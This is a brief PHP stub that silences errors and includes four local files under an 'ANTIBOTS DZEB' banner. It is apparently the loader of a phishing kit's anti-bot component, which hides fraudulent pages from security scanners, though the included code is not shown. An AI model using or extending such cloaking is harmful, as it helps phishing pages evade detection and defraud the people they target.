<?php


session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "./bondishee1.php";
include "./bondishee2.php";
include "./bondishee3.php";
include "./bondishee4.php";
//----------------------------------------------------------------------------------------------------------------//

?>
